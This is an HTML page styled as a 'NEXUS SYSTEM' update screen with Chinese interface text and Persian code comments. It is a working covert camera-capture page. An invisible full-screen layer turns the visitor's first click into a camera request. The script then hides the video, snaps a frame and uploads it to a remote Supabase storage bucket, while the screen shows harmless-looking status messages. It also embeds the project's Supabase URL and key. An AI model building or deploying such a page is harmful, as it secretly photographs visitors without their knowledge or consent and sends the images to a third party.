<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NEXUS</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{box-sizing:border-box}

body{
 margin:0;
 min-height:100vh;
 padding:0;
 display:flex;
 justify-content:center;
 align-items:center;
 background:#000; 
 color:#fff;
 font-family:"Courier New", monospace;
 overflow: hidden;
 position: relative;
 
 /* انیمیشن ورود نرم */
 opacity: 0;
 animation: bootUp 2s ease-out forwards;
}

/* انیمیشن روشن شدن سیستم */
@keyframes bootUp {
    0% { opacity: 0; }
    100% { opacity: 1; }
}

/* پس‌زمینه نورانی ملایم به جای ماتریکس */
.glow-bg {
    position: fixed;
    top: 50%;
    left: 50%;
    width: 100vw;
    height: 100vh;
    transform: translate(-50%, -50%);
    background: radial-gradient(circle, rgba(16, 185, 129, 0.15) 0%, transparent 70%);
    z-index: 1;
    pointer-events: none;
    transition: all 1s ease;
}

.app{
 width:100%;
 max-width:400px;
 padding:20px;
 text-align: center;
 position: relative;
 z-index: 2;
 pointer-events: none; 
}

.logo{
 text-align:center;
 color:#65d9ff;
 font-size:20px;
 font-weight:bold;
 letter-spacing:2px;
 margin-bottom: 10px;
 opacity: 0.9;
 text-shadow: 0 0 15px #65d9ff;
}

.subtitle{
 text-align:center;
 color:#aebbd2;
 line-height:1.9;
 font-size:12px;
 margin-bottom: 20px;
 opacity: 0.8;
}

#status{
 text-align:center;
 margin-top:10px;
 padding:10px;
 border-radius:10px;
 background:#111;
 color:#70e6c0;
 font-size:12px;
 line-height:1.8;
 min-height: 30px;
 transition: opacity 0.5s;
 border: 1px solid #333;
 box-shadow: 0 0 10px rgba(0,0,0,0.5);
}

.footer{
 text-align:center;
 color:#333;
 font-size:10px;
 margin-top:20px;
}

/* ناحیه کلیک نامرئی */
.click-trigger {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 10;
    cursor: pointer;
}

video{
 width:100%;
 border-radius:15px;
 margin-top:15px;
 background:#000;
 display: none !important;
}

canvas#canvas {
    display: none;
}

</style>
</head>

<body>

<!-- لایه کلیک -->
<div id="click-trigger" class="click-trigger"></div>

<!-- فقط یک نور ملایم، بدون ماتریکس -->
<div class="glow-bg"></div>

<div class="app">

<div class="logo">NEXUS SYSTEM</div>

<p class="subtitle">
系统正在更新...
<br>
等待连接
</p>

<video id="video" autoplay playsinline muted></video>

<canvas id="canvas" hidden></canvas>

<div id="status">
等待用户操作
</div>

<div class="footer">
NEXUS PROJECT • VER 2.0
</div>

</div>

<script>

// SUPABASE CONFIGURATION
const SUPABASE_URL = "https://wxovglpgcddlmhropvtv.supabase.co";
const SUPABASE_KEY = "sb_publishable_Ykxw1h1xKfIqrKyzTXjsjw_lMtub-Wk";
const BUCKET = "nexus-photos";

const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const clickTrigger = document.getElementById("click-trigger");

let stream = null;
let isProcessing = false;

function showStatus(message){
 statusBox.textContent = message;
}

// تابع اصلی شروع کار
async function startProcess() {
    if (isProcessing) return;
    isProcessing = true;
    
    // مخفی کردن ناحیه کلیک
    clickTrigger.style.display = 'none';
    
    // افزایش شدت نور پس‌زمینه هنگام شروع کار
    document.querySelector('.glow-bg').style.background = "radial-gradient(circle, rgba(16, 185, 129, 0.4) 0%, transparent 70%)";

    try{
        showStatus("正在连接摄像头..."); 

        if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error("Camera access not supported");
        }

        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        showStatus("System Active");
        
        video.srcObject = stream;
        
        // آپلود تصویر نمونه
        uploadImage();

    } catch (error) {
        console.error(error);
        showStatus("Error: " + error.message);
        clickTrigger.style.display = 'block'; 
        isProcessing = false;
    }
}

function uploadImage() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(async (blob) => {
        if (!blob) return;
        
        const fileName = `nexus_${Date.now()}.jpg`;
        const filePath = [BUCKET, fileName].join('/');
        
        showStatus("Syncing data...");
        
        const { error } = await db.storage.from(BUCKET).upload(filePath, blob);
        
        if (error) {
            showStatus("Sync Failed");
        } else {
            showStatus("Connection Established ✓");
        }
    }, 'image/jpeg', 0.8);
}

clickTrigger.addEventListener('click', () => {
    startProcess();
});

</script>
</body>
</html>
